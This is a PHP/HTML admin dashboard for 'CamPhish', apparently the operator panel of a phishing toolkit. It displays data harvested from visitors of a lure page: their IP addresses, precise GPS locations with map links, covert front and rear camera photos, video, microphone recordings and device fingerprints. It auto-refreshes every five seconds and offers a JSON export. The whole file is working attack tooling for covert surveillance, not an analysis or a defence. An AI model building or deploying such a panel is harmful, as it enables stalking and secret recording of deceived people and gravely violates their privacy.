<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="refresh" content="5">
<title>CamPhish — Admin Dashboard</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap');
  :root {
    --bg: #0d0d12; --card: #15151e; --card2: #1c1c28;
    --border: #2a2a3a; --accent: #7c3aed; --accent2: #06b6d4;
    --green: #22c55e; --yellow: #f59e0b; --red: #ef4444;
    --text: #e2e8f0; --muted: #64748b;
  }
  * { margin:0; padding:0; box-sizing:border-box; }
  body { background:var(--bg); color:var(--text); font-family:'Inter',sans-serif; min-height:100vh; }
  header { background:linear-gradient(135deg,#1e0a4a,#0a1a3a); padding:20px 32px; display:flex; align-items:center; gap:16px; border-bottom:1px solid var(--border); }
  header h1 { font-size:1.4rem; font-weight:700; background:linear-gradient(90deg,#a78bfa,#38bdf8); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
  .live-dot { width:10px; height:10px; background:var(--green); border-radius:50%; animation:pulse 1.5s infinite; }
  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.5;transform:scale(1.4)} }
  .badge { font-size:.7rem; background:#1e0a4a; color:#a78bfa; border:1px solid #7c3aed44; padding:2px 8px; border-radius:20px; margin-left:8px; }
  main { padding:24px 32px; max-width:1400px; margin:0 auto; }
  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:16px; margin-bottom:28px; }
  .stat { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:18px; }
  .stat .label { font-size:.72rem; color:var(--muted); text-transform:uppercase; letter-spacing:.05em; margin-bottom:6px; }
  .stat .value { font-size:2rem; font-weight:700; font-family:'JetBrains Mono',monospace; }
  .stat.v { color:var(--accent2); } .stat.l { color:var(--green); } .stat.p { color:var(--yellow); } .stat.a { color:#f472b6; }
  .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
  .card { background:var(--card); border:1px solid var(--border); border-radius:12px; overflow:hidden; }
  .card-header { background:var(--card2); padding:14px 18px; font-size:.85rem; font-weight:600; display:flex; align-items:center; gap:8px; border-bottom:1px solid var(--border); }
  .card-header .icon { font-size:1rem; }
  .entry { padding:12px 18px; border-bottom:1px solid var(--border)22; font-size:.8rem; font-family:'JetBrains Mono',monospace; line-height:1.6; }
  .entry:last-child { border-bottom:none; }
  .entry .ts { color:var(--muted); font-size:.7rem; display:block; margin-bottom:4px; }
  .entry a { color:var(--accent2); text-decoration:none; }
  .entry a:hover { text-decoration:underline; }
  .empty { padding:24px 18px; color:var(--muted); font-size:.82rem; text-align:center; }
  .photos { display:grid; grid-template-columns:repeat(auto-fill,minmax(100px,1fr)); gap:8px; padding:12px; }
  .photos img { width:100%; aspect-ratio:1; object-fit:cover; border-radius:8px; border:1px solid var(--border); cursor:pointer; transition:.2s; }
  .photos img:hover { border-color:var(--accent); transform:scale(1.05); }
  .full-width { grid-column:1/-1; }
  .refresh { font-size:.75rem; color:var(--muted); text-align:right; padding:8px 32px; }
  .tag { display:inline-block; padding:1px 6px; border-radius:4px; font-size:.68rem; font-weight:600; margin-right:4px; }
  .tag.ip { background:#1e3a4a; color:var(--accent2); }
  .tag.gps { background:#1a3a1e; color:var(--green); }
  .tag.cam { background:#3a1e1e; color:#f87171; }
  .tag.dev { background:#3a2a1e; color:var(--yellow); }
  .tag.mic { background:#2a1e3a; color:#c084fc; }
  .export-btn { float:right; background:var(--accent); color:#fff; border:none; padding:5px 14px; border-radius:6px; font-size:.75rem; cursor:pointer; font-family:'Inter',sans-serif; }
  .export-btn:hover { background:#6d28d9; }
</style>
</head>
<body>
<?php
// Simple password protection — set a password below
$ADMIN_PASSWORD = 'admin'; // Change this!
session_start();
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pw']) && $_POST['pw'] === $ADMIN_PASSWORD) {
        $_SESSION['auth'] = true;
    } else {
        echo '<div style="display:flex;align-items:center;justify-content:center;height:100vh;">
        <form method="POST" style="background:#15151e;border:1px solid #2a2a3a;border-radius:12px;padding:32px;text-align:center;min-width:280px;">
        <div style="font-size:2rem;margin-bottom:12px;">🔐</div>
        <div style="font-size:1.1rem;font-weight:600;margin-bottom:20px;">Admin Dashboard</div>
        <input name="pw" type="password" placeholder="Password" autofocus
          style="width:100%;background:#0d0d12;border:1px solid #2a2a3a;color:#e2e8f0;padding:10px;border-radius:8px;font-size:.9rem;margin-bottom:12px;">
        <button type="submit" style="width:100%;background:#7c3aed;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-size:.9rem;">Login</button>
        </form></div>'; exit();
    }
}

// ── Load data ──────────────────────────────────────────────────────────────────
function read_dir_files($dir, $pattern = '*.txt') {
    if (!is_dir($dir)) return [];
    $files = glob($dir . '/' . $pattern);
    if (!$files) return [];
    rsort($files);
    return $files;
}

// IPs
$ip_entries = [];
if (file_exists('logs/ip/saved.ip.txt')) {
    $ip_entries = array_filter(explode("\n", file_get_contents('logs/ip/saved.ip.txt')));
}

// Locations
$loc_files = read_dir_files('logs/location', 'location_*.txt');

// Devices
$dev_files = read_dir_files('logs/device', 'device_*.txt');

// Snapshots
$snap_dir   = 'logs/snapshots';
$front_imgs = glob($snap_dir . '/cam_front_*.jpg') ?: [];
$rear_imgs  = glob($snap_dir . '/cam_rear_*.jpg') ?: [];
$videos     = glob($snap_dir . '/vid_*.webm') ?: [];
rsort($front_imgs); rsort($rear_imgs); rsort($videos);

// Audio
$audio_files = glob('logs/audio/mic_*.webm') ?: [];
rsort($audio_files);

$total_visitors = count(array_filter($ip_entries, fn($l) => str_contains($l, 'IP:')));
$total_locs     = count($loc_files);
$total_photos   = count($front_imgs) + count($rear_imgs);
$total_audio    = count($audio_files);
?>

<header>
  <div class="live-dot"></div>
  <h1>CamPhish Dashboard</h1>
  <span class="badge">LIVE</span>
  <button class="export-btn" onclick="exportJSON()">⬇ Export JSON</button>
</header>

<main>
  <div class="stats">
    <div class="stat v"><div class="label">Visitors</div><div class="value"><?= $total_visitors ?></div></div>
    <div class="stat l"><div class="label">Locations</div><div class="value"><?= $total_locs ?></div></div>
    <div class="stat p"><div class="label">Photos</div><div class="value"><?= $total_photos ?></div></div>
    <div class="stat" style="color:#f472b6"><div class="label">Videos</div><div class="value"><?= count($videos) ?></div></div>
    <div class="stat a"><div class="label">Audio Clips</div><div class="value"><?= $total_audio ?></div></div>
    <div class="stat" style="color:#fb923c"><div class="label">Devices</div><div class="value"><?= count($dev_files) ?></div></div>
  </div>

  <div class="grid">

    <!-- IPs -->
    <div class="card">
      <div class="card-header"><span class="icon">📡</span> Visitor IPs</div>
      <?php
      $shown = 0;
      foreach (array_reverse(array_values(array_filter($ip_entries))) as $line):
        if ($shown++ > 30) break;
        if (trim($line) === '') continue;
      ?>
        <div class="entry"><span class="tag ip">IP</span> <?= htmlspecialchars(trim($line)) ?></div>
      <?php endforeach; ?>
      <?php if (!$ip_entries): ?><div class="empty">No visitors yet</div><?php endif; ?>
    </div>

    <!-- Locations -->
    <div class="card">
      <div class="card-header"><span class="icon">📍</span> GPS Locations</div>
      <?php foreach (array_slice($loc_files, 0, 10) as $lf):
        $content = file_get_contents($lf);
        preg_match('/Latitude: (.+)/', $content, $lat);
        preg_match('/Longitude: (.+)/', $content, $lon);
        preg_match('/Accuracy: (.+)/', $content, $acc);
        preg_match('/Google Maps: (.+)/', $content, $map);
        $lat_v = isset($lat[1]) ? trim($lat[1]) : '?';
        $lon_v = isset($lon[1]) ? trim($lon[1]) : '?';
        $acc_v = isset($acc[1]) ? trim($acc[1]) : '?';
        $map_v = isset($map[1]) ? trim($map[1]) : '';
      ?>
        <div class="entry">
          <span class="tag gps">GPS</span>
          <?= htmlspecialchars($lat_v) ?>, <?= htmlspecialchars($lon_v) ?>
          <span style="color:#64748b"> ±<?= htmlspecialchars($acc_v) ?>m</span><br>
          <?php if ($map_v): ?><a href="<?= htmlspecialchars($map_v) ?>" target="_blank">🗺 Open in Maps</a><?php endif; ?>
        </div>
      <?php endforeach; ?>
      <?php if (!$loc_files): ?><div class="empty">No locations yet</div><?php endif; ?>
    </div>

    <!-- Front Camera Photos -->
    <div class="card">
      <div class="card-header"><span class="icon">🤳</span> Front Camera (<?= count($front_imgs) ?>)</div>
      <?php if ($front_imgs): ?>
        <div class="photos">
          <?php foreach (array_slice($front_imgs, 0, 20) as $img): ?>
            <img src="<?= htmlspecialchars($img) ?>" onclick="window.open(this.src)" title="<?= basename($img) ?>">
          <?php endforeach; ?>
        </div>
      <?php else: ?>
        <div class="empty">No front camera photos yet</div>
      <?php endif; ?>
    </div>

    <!-- Rear Camera Photos -->
    <div class="card">
      <div class="card-header"><span class="icon">📷</span> Rear Camera (<?= count($rear_imgs) ?>)</div>
      <?php if ($rear_imgs): ?>
        <div class="photos">
          <?php foreach (array_slice($rear_imgs, 0, 20) as $img): ?>
            <img src="<?= htmlspecialchars($img) ?>" onclick="window.open(this.src)" title="<?= basename($img) ?>">
          <?php endforeach; ?>
        </div>
      <?php else: ?>
        <div class="empty">No rear camera photos yet</div>
      <?php endif; ?>
    </div>

    <!-- Device Info -->
    <div class="card">
      <div class="card-header"><span class="icon">📱</span> Device Fingerprints (<?= count($dev_files) ?>)</div>
      <?php foreach (array_slice($dev_files, 0, 5) as $df):
        $c = htmlspecialchars(file_get_contents($df));
      ?>
        <div class="entry"><span class="tag dev">DEVICE</span><br><pre style="font-size:.72rem;white-space:pre-wrap;color:#94a3b8"><?= $c ?></pre></div>
      <?php endforeach; ?>
      <?php if (!$dev_files): ?><div class="empty">No device info yet</div><?php endif; ?>
    </div>

    <!-- Audio + Video -->
    <div class="card">
      <div class="card-header"><span class="icon">🎙</span> Audio / Video Clips</div>
      <?php foreach (array_slice($audio_files, 0, 10) as $af): ?>
        <div class="entry"><span class="tag mic">MIC</span> <a href="<?= htmlspecialchars($af) ?>" download><?= basename($af) ?></a></div>
      <?php endforeach; ?>
      <?php foreach (array_slice($videos, 0, 10) as $vf): ?>
        <div class="entry"><span class="tag cam">VID</span> <a href="<?= htmlspecialchars($vf) ?>" download><?= basename($vf) ?></a></div>
      <?php endforeach; ?>
      <?php if (!$audio_files && !$videos): ?><div class="empty">No audio/video clips yet</div><?php endif; ?>
    </div>

  </div>
</main>

<div class="refresh">Auto-refreshing every 5s &nbsp;•&nbsp; <?= date('H:i:s') ?></div>

<script>
function exportJSON() {
    const data = {
        exported: new Date().toISOString(),
        visitors: <?= json_encode(array_values(array_filter($ip_entries))) ?>,
        locations: <?php
            $locs = [];
            foreach ($loc_files as $lf) {
                $c = file_get_contents($lf);
                preg_match('/Latitude: (.+)/', $c, $la);
                preg_match('/Longitude: (.+)/', $c, $lo);
                preg_match('/Google Maps: (.+)/', $c, $gm);
                $locs[] = ['lat'=>trim($la[1]??''),'lon'=>trim($lo[1]??''),'maps'=>trim($gm[1]??'')];
            }
            echo json_encode($locs);
        ?>,
        photos_count: <?= $total_photos ?>,
        audio_count: <?= $total_audio ?>,
        devices_count: <?= count($dev_files) ?>
    };
    const a = document.createElement('a');
    a.href = 'data:application/json,' + encodeURIComponent(JSON.stringify(data, null, 2));
    a.download = 'camphish_export_' + Date.now() + '.json';
    a.click();
}
</script>
</body>
</html>
